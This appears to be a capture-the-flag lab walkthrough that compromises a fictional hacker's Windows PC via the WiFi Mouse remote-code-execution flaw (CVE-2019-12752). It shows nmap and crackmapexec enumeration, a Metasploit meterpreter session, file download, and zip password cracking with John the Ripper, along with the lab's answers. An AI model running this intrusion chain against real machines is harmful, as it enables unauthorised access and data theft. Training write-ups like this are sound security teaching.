# 04 - Shadow Track (Lab)

Close surveillance allowed us to identify a member of a hacker group named Harry while he was working in a cafe. We believe that Harry was using the cafe's Wi-Fi network to launch various cyber-attacks. This gives us the opportunity to learn more about his activities by accessing his computer through the cafe's network.

Your task is to infiltrate Harry's computer via the cafe's Wi-Fi network and uncover the cyber attacks and communication networks of this hacker group.


Questions Walkthrough:1. What is the name of the target computer?

To begin, we need to enumerate the ports and services running on Harry's computer. We can use nmap for this purpose.
```
 nmap -p- --open -n --max-retries 5000 -sS -vvv -Pn 172.20.31.12 -oG allPorts
```

![](../Assets/Pasted%20image%2020251028154318.png)


Then lets perform a more in depth scan on the open ports

```
nmap -sSVC -p135,139,445,1978,5040,49664,49665,49666,49667,49668,49669,49672 172.20.31.12
```

Since its running SMB lets try to make a crackmapexec to get the name of the computer.
```
crackmapexec smb 172.20.31.12
```

![](Assets/Pasted%20image%2020251028153926.png)


Answer:DESKTOP-BG4O059

Question 2: What is the operating system of the target computer?
Answer: Windows 10
Question 3: What is the domain name of the website whose user information was compromised by the hacker group?
Lets look for vulnerabilities on open ports.
```
1978: WiFi Mouse service
```
What is WiFi Mouse RCE?

CVE-2019–12752

WiFi Mouse is a legitimate application, but versions up to 1.7.5.9 contain a critical vulnerability:

Lets head to msfconsole and search for it.
```
msfconsole
search wifi_mouse
```

![](Assets/Pasted%20image%2020251028154958.png)


After enumerating if we go to cd C:\Users\Harry\Desktop we can find three interesting files:
1. **response.txt** — Large file (likely contains stolen data)
2. **Telegram.txt** — Communication information
3. **malware.zip** — Malicious software used by the group

Lets look for the domain name on the response.txt file.
```
findstr /R /C:"http[s]*://[a-zA-Z0-9./?=_-]*" response.txt
```

![](Assets/Pasted%20image%2020251028155454.png)

Answer: trustbank.hv

Question 4: What is the number of compromised user data?
Lets count the number of lines on the response.txt file and filter only the email addresses.
```
findstr /R /C:"[a-zA-Z0-9._-]*@[a-zA-Z0-9.-]*" response.txt | find /c /v ""
```

Question 5: What are any of the other websites targeted by the hacker group?
Lets enumerate a bit more
```
cd C:\Users\Harry\Documents\hack
dir
```

![](Assets/Pasted%20image%2020251028155942.png)


Here we have a targets_domains.txt lets see the content
```
type target_domains.txt
```

Answer: primelogistics.hv

Question 6: What is the group participation link to the platform on which the hacker group communicates?

If we read the previous Telegram.txt file there we can find the link

Answer: t.me/+37NnWAZY2HTaYjM9A

Question 7: What is the MD5 hash value of the malware used by the hacker group?
Lets find the malware.zip file and download it to our machine. Lets make a command to find any file that has malware on its name on Windows.
```
dir /s /b | findstr /i "malware"
```
Found it on C:\Users\Harry\Downloads\malware.zip

Lets download it from the meterpreter session
```
download C:\Users\Harry\Downloads\malware.zip
```
Then if we try to unzip it in linux it asks for a password.
```
zip2john malware.zip > ziphash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt
```


![](Assets/Pasted%20image%2020251028162050.png)

Lets unzip it now
```
unzip malware.zip
```
And finally calculate the md5 hash of the malware file

```
md5sum malware.exe
```


Answer: 035bce7b8ecd5e46298e2666c5ba2fb2